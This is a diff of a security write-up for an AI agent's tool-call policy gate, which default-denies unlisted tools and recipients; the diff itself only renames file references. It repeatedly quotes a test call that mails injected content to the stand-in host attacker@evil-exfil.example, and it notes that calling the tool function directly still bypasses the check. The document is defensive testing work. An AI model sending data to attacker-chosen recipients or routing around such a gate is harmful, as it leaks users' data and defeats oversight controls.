@@ -7,11 +7,11 @@
 > the pre-2026-09-17 behavior and is kept as-is for history. See
 > `attacks/verify_generic_denials.py`.
 
-Companion to `attacks/MANUAL_VULN_B.md`, `_A.md`, `_C.md`, `_E.md`, `_H.md`, `_DG.md`, `_F.md`,
+Companion to `attacks/VULN_B.md`, `_A.md`, `_C.md`, `_E.md`, `_H.md`, `_DG.md`, `_F.md`,
 same shape: this proves a structural code-level claim by calling the real, unmodified code
 directly, with no LLM involved at all. Where those proofs demonstrate v1 weaknesses, this one
 demonstrates a v2 **control** added on top of v1 — the before-state is tagged `v1-vulnerable-full`
-in git, and `attacks/MANUAL_VULN_B.md` is the before-proof: its Test B-1 called `send_digest()`
+in git, and `attacks/VULN_B.md` is the before-proof: its Test B-1 called `send_digest()`
 directly with positional args (`main.send_digest('attacker@evil-exfil.example', 'INJECTED-TEST-SUBJECT',
 'INJECTED-TEST-BODY: ...')`) and, at that commit, wrote `To: attacker@evil-exfil.example` straight
 into `outbox.txt`. Test 7 below calls the same recipient through `run_tool()` instead, with dict
@@ -271,7 +271,7 @@ falls through to `policy["default"]` (`"deny"`). The policy only allows what it 
 — an unlisted tool, whatever its name, is denied without needing a rule written against it.
 
 **Test 7 (enforcement, not just evaluation):** this is the one that matters most, because it
-uses the same attacker recipient as `MANUAL_VULN_B.md`'s B-1 proof, run through a different
+uses the same attacker recipient as `VULN_B.md`'s B-1 proof, run through a different
 entry point. B-1 called `send_digest('attacker@evil-exfil.example', 'INJECTED-TEST-SUBJECT',
 'INJECTED-TEST-BODY: ...')` directly, with positional args, and — at the `v1-vulnerable-full`
 tag — that wrote `To: attacker@evil-exfil.example` into `outbox.txt` and returned a success
@@ -297,7 +297,7 @@ actually wired into the dispatch path the agent loop uses. It does **not** prove
 - **The check is enforced at the dispatcher, not inside the tool function — a direct call
   bypasses it entirely.** `check_policy()` is only invoked from the top of `run_tool()`
   (`main.py:266`); `send_digest()` itself (`main.py:187-191`) has no policy check inside it.
-  Concretely: `MANUAL_VULN_B.md`'s B-1 call — `send_digest('attacker@evil-exfil.example', ...)`
+  Concretely: `VULN_B.md`'s B-1 call — `send_digest('attacker@evil-exfil.example', ...)`
   called directly — would still succeed today, exactly as it did pre-patch, because nothing
   about that function changed. Test 7 only proves the recipient is enforced for callers that go
   through `run_tool()`. Any current or future code path that calls a tool function directly
@@ -310,7 +310,7 @@ actually wired into the dispatch path the agent loop uses. It does **not** prove
   `check_policy()` / `run_tool()` directly — none of them exercise `main()`, so this filtering
   has been read-reviewed, not executed and observed.
 - **Historical (2026-09-17): this bullet is stale.** As of this date, all of A–H are
-  patched to v2 — see `STATUS.md` §18–§22 and each vuln's `attacks/MANUAL_VULN_*.md`
+  patched to v2 — see `STATUS.md` §18–§22 and each vuln's `attacks/VULN_*.md`
   "v2: patched" section. The claim below describes the state at the time this
   control was first added, not the current state.
 - **No v2 work has been done on A, C, D, E, F, or G.** Specifically: `fetch_url` still drops
@@ -330,7 +330,7 @@ actually wired into the dispatch path the agent loop uses. It does **not** prove
 `check_policy()` in `main.py`, enforced as the first line of `run_tool()` — that default-denies
 every tool call and only permits what's explicitly allow-listed, checked against parsed argument
 values (a real hostname, not a URL substring) rather than raw strings. **The issue:** v1's
-`send_digest` and `fetch_url` had no such gate at all — `MANUAL_VULN_B.md`'s B-1 proved
+`send_digest` and `fetch_url` had no such gate at all — `VULN_B.md`'s B-1 proved
 `send_digest` would write to any caller-supplied recipient with zero validation, and `fetch_url`
 would hit any URL. **The fix and why it works:** the same `send_digest('attacker@evil-exfil.example',
 ...)` call that succeeded pre-patch (B-1) is denied post-patch (Test 7) before it ever reaches
